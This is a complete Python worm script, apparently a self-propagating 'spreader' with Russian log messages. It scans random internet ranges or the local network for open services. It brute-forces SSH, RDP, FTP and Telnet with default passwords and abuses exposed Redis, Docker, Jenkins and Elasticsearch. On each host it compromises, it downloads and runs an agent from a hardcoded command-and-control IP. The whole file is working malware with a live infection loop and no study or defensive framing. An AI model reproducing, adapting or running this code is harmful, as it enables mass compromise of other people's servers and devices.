#!/usr/bin/env python3
# AVZ-Aristo Spreader v25.10.8 – полный, без сокращений
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 500
QUICK_TIMEOUT = 1.2
BRUTE_TIMEOUT = 2.0
DEFAULT_SCAN_COUNT = 20_000
PORT_LIST = [21, 22, 23, 80, 443, 2375, 3306, 3389, 445, 6379, 8080, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("user","user"), ("user","password"), ("user","123456"),
    ("test","test"), ("guest","guest"), ("pi","raspberry"), ("root",""), ("admin","")
]

TOP_RANGES = [
    "8.0.0.0/8", "13.0.0.0/8", "34.0.0.0/8", "35.0.0.0/8", "45.0.0.0/8",
    "52.0.0.0/8", "54.0.0.0/8", "64.0.0.0/8", "74.0.0.0/8", "104.0.0.0/8",
    "136.0.0.0/8", "142.0.0.0/8", "152.0.0.0/8", "172.0.0.0/8", "185.0.0.0/8"
]

def random_ip():
    if random.random() < 0.7:
        r = random.choice(TOP_RANGES)
        net, mask = r.split("/")
        octets = list(map(int, net.split(".")))
        host = random.randint(0, (1 << (32 - int(mask))) - 1)
        for i in range(4):
            octets[i] |= (host >> (8*(3-i))) & 0xFF
        return ".".join(map(str, octets))
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(0, 255)
        if a == 10: continue
        if a == 127: continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a == 169 and b == 254: continue
        if a >= 224: continue
        return f"{a}.{b}.{c}.{d}"

async def probe_port(ip, port):
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
        w.close(); await w.wait_closed()
        return True
    except:
        return False

async def ssh_brute(ip):
    print(f"[SSH] Попытка {ip}", flush=True)
    try:
        import asyncssh
        for u, p in CREDS[:10]:
            try:
                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=3) as conn:
                    await conn.run(f"wget -O- {AGENT_URL} | bash")
                    return True
            except:
                continue
    except ImportError:
        pass

    try:
        import paramiko
        for u, p in CREDS:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=u, password=p, timeout=3, banner_timeout=3, auth_timeout=3,
                               allow_agent=False, look_for_keys=False)
                client.exec_command(f"wget -O- {AGENT_URL} | bash", get_pty=True)
                client.close()
                return True
            except paramiko.ssh_exception.SSHException:
                continue
            except:
                continue
    except ImportError:
        pass

    for u, p in CREDS[:15]:
        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
        try:
            subprocess.run(cmd, shell=True, timeout=4, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except:
            continue
    print(f"[SSH] Неудача {ip}", flush=True)
    return False

async def rdp_brute(ip):
    if sys.platform != 'linux':
        return False
    for u, p in CREDS[:10]:
        cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
        try:
            await asyncio.wait_for(proc.communicate(), timeout=3)
            if proc.returncode == 0:
                await asyncio.create_subprocess_shell(f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'")
                return True
        except:
            pass
    return False

async def ftp_brute(ip):
    for u, p in CREDS[:10]:
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
            ftp.login(u, p)
            with open("/tmp/agent.sh", "w") as f:
                f.write(f"wget -O- {AGENT_URL} | bash")
            with open("/tmp/agent.sh", "rb") as f:
                ftp.storbinary("STOR agent.sh", f)
            ftp.quit()
            return True
        except:
            pass
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
        ftp.login()
        ftp.quit()
        return True
    except:
        pass
    return False

async def exploit_redis(ip):
    try:
        import redis
        r = redis.Redis(host=ip, port=6379, socket_timeout=2)
        r.ping()
        r.set('crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n\n')
        r.config_set('dir', '/root/.ssh')
        r.config_set('dbfilename', 'authorized_keys')
        r.save(); r.close()
        return True
    except Exception as e:
        print(f"[Redis] {ip} ошибка: {e}", flush=True)
    return False

async def exploit_docker(ip):
    try:
        import docker
        client = docker.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
        client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
        client.close()
        return True
    except Exception as e:
        print(f"[Docker] {ip} ошибка: {e}", flush=True)
    return False

async def exploit_jenkins(ip):
    url = f'http://{ip}:8080/script'
    script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, data={'script': script}, timeout=3) as resp:
                return resp.status == 200
    except:
        pass
    return False

async def exploit_telnet(ip):
    for u, p in CREDS[:5]:
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=1.5)
            writer.write(u.encode() + b"\r\n")
            await writer.drain()
            await asyncio.sleep(0.2)
            writer.write(p.encode() + b"\r\n")
            await writer.drain()
            await asyncio.sleep(0.2)
            writer.write(f"wget -O- {AGENT_URL} | sh\r\n".encode())
            await writer.drain()
            await asyncio.sleep(0.3)
            writer.write(b"exit\r\n")
            await writer.drain()
            writer.close()
            return True
        except:
            pass
    return False

async def exploit_elasticsearch(ip):
    payload = {"size":1, "script_fields": {"lol": {"script": f"java.lang.Runtime.getRuntime().exec('wget -O- {AGENT_URL} | sh')"}}}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
                return resp.status == 200
    except:
        pass
    return False

async def exploit_wordpress(ip):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(f'http://{ip}/xmlrpc.php', data='<methodCall><methodName>system.listMethods</methodName></methodCall>', timeout=2) as resp:
                if resp.status == 200:
                    return True
    except:
        pass
    return False

async def infect(ip, port_stats):
    ports = PORT_LIST
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    for i, p in enumerate(ports):
        if open_ports[i]:
            port_stats[p] = port_stats.get(p, 0) + 1
    if open_ports[2] and await ssh_brute(ip):   # SSH
        print(f"[INFECTED] {ip} via SSH", flush=True)
        return True
    if open_ports[7] and await rdp_brute(ip):   # RDP
        print(f"[INFECTED] {ip} via RDP", flush=True)
        return True
    if open_ports[0] and await ftp_brute(ip):   # FTP
        print(f"[INFECTED] {ip} via FTP", flush=True)
        return True
    if open_ports[9] and await exploit_redis(ip): # Redis
        print(f"[INFECTED] {ip} via Redis", flush=True)
        return True
    if open_ports[5] and await exploit_docker(ip): # Docker
        print(f"[INFECTED] {ip} via Docker", flush=True)
        return True
    if open_ports[10] and await exploit_jenkins(ip): # Jenkins
        print(f"[INFECTED] {ip} via Jenkins", flush=True)
        return True
    if open_ports[3] and await exploit_telnet(ip): # Telnet
        print(f"[INFECTED] {ip} via Telnet", flush=True)
        return True
    if open_ports[11] and await exploit_elasticsearch(ip): # Elasticsearch
        print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
        return True
    if open_ports[4] or open_ports[5]:
        if await exploit_wordpress(ip):
            print(f"[INFECTED] {ip} via WordPress", flush=True)
            return True
    return False

async def worker(queue, stats, port_stats, progress_cb=None):
    while True:
        ip = await queue.get()
        try:
            if await infect(ip, port_stats):
                stats['success'] += 1
            else:
                stats['fail'] += 1
        except:
            stats['fail'] += 1
        if progress_cb:
            await progress_cb()
        queue.task_done()

async def scan_cycle(ips, progress_callback=None):
    q = asyncio.Queue()
    stats = {'success':0, 'fail':0}
    port_stats = {}
    count = len(ips)
    progress_count = 0

    async def progress_inner():
        nonlocal progress_count
        progress_count += 1
        if progress_count % 500 == 0 and progress_callback:
            await progress_callback(progress_count, count, stats, port_stats)

    for ip in ips:
        q.put_nowait(ip)
    tasks = [asyncio.create_task(worker(q, stats, port_stats, progress_inner)) for _ in range(MAX_CONCURRENT)]
    await q.join()
    for t in tasks:
        t.cancel()
    return stats, port_stats

async def global_scan(count, progress_callback=None):
    ips = [random_ip() for _ in range(count)]
    return await scan_cycle(ips, progress_callback)

async def local_scan(progress_callback=None):
    ips = get_local_ips()
    if not ips:
        return {'success':0, 'fail':0}, {}
    print(f"[*] Scanning local network, {len(ips)} hosts", flush=True)
    return await scan_cycle(ips, progress_callback)

def get_local_ips():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        return []
    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    return [str(host) for host in network.hosts() if str(host) != local_ip]

async def main_async(args):
    print("[*] Checking C2 connection...", flush=True)
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping")
        s.recv(1024)
        s.close()
        print("[+] C2 reachable", flush=True)
    except Exception as e:
        print(f"[!] C2 unreachable: {e}", flush=True)

    async def gui_progress(current, total, stats, port_stats):
        port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
        if port_str:
            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
        else:
            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)

    if args.local:
        print("[*] Mode: local network", flush=True)
        while True:
            stats, port_stats = await local_scan(gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)
    else:
        print(f"[*] Mode: global, {args.count} targets per cycle", flush=True)
        while True:
            stats, port_stats = await global_scan(args.count, gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
    group.add_argument('--local', action='store_true')
    args = parser.parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[*] Spreader stopped", flush=True)

if __name__ == '__main__':
    main()